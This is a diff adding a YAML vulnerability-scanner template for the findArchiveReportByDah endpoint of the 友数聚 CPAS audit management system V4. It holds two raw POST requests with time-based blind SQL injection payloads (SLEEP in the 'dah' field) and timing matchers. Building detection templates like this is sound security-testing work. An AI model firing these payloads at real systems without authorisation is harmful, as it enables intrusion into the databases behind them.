@@ -1,0 +1,28 @@
+id: youshuju-CPAS-findArchiveReportByDah-sql-time
+
+info:
+  name: 友数聚CPAS审计管理系统V4 findArchiveReportByDah SQL注入漏洞
+  author: youshuju
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        dah=1' AND (SELECT * FROM (SELECT(SLEEP(1)))x) AND '1'='1
+      - |
+        POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        dah=1' AND (SELECT * FROM (SELECT(SLEEP(2)))x) AND '1'='1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=3 && duration_1<=4'  
+          - 'duration_2>=6 && duration_2<=7'
+        condition: and
